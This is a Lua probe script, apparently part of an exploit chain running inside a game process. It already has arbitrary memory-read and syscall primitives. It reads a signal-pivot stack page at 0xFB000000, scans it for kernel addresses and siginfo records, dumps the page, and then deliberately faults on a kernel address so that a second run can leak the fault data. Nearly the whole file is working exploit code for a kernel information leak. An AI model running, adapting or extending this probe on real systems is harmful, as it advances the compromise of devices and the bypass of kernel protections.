-- CRASH_CLASS: HIGH
-- PROBE 991a: is the kernel's siginfo left in the signal pivot page?
--
-- The loader's handler pivots RSP to 0xfb0000bd (`mov esp, 0xfb0000bd; ret`) and the
-- kernel builds the signal frame — siginfo and ucontext — on that stack. The page is
-- mapped by map_fixed_address(0xfb000000, 0x2000) and is still mapped in the next
-- connection, because the game process persists. So after a deliberate fault we may be
-- able to read si_code/si_addr out of it, which the handler itself never copies.
--
-- Run twice: the first run prints the pre-fault page and faults; the second prints the
-- same page again and the scanner looks for the fault address it carries.

print("=== PROBE 991a: SIGINFO PAGE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) else return nil end end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) else return nil end end

local pid = to_num(mk(20)())
print(string.format("[A] pid=%u", pid))

local base = 0xFB000000
local head = rq(base)
print(string.format("[B] pivot page %s read=%s", string.format("0x%X", base), head and "OK" or "UNMAPPED"))

if head then
    -- scan for an address-shaped qword and for a siginfo header (11, 0, code)
    local found = {}
    for off = 0, 0x1E00, 8 do
        local v = rq(base + off)
        if v and v > 0xFFFF800000000000 then
            found[#found+1] = string.format("kva@+0x%X=0x%X", off, v)
        end
    end
    print(string.format("[C] kernel-shaped qwords: %d", #found))
    for i = 1, math.min(#found, 6) do print("    " .. found[i]) end
    -- dump the first 0x200 bytes so two runs can be compared
    for row = 0, 0x1F do
        local a = base + row * 0x10
        print(string.format("    +0x%03X  %016X %016X", row*0x10, rq(a) or 0, rq(a+8) or 0))
    end
    -- siginfo candidates: signo 11 at +0, si_code small at +8
    for off = 0, 0x1E00, 8 do
        local s = rd(base + off)
        if s == 11 then
            print(string.format("[D] signo 11 at +0x%X: code=%s errno=%s", off, tostring(rd(base+off+8)), tostring(rd(base+off+4))))
        end
    end
end

print("[E] MARKER-BEFORE-FAULT")
local ok, err = pcall(function() return memory.read_qword(0xFFFFFFFF80000000) end)
print(string.format("[F] returned ok=%s", tostring(ok)))
print("=== COMPLETE ===")
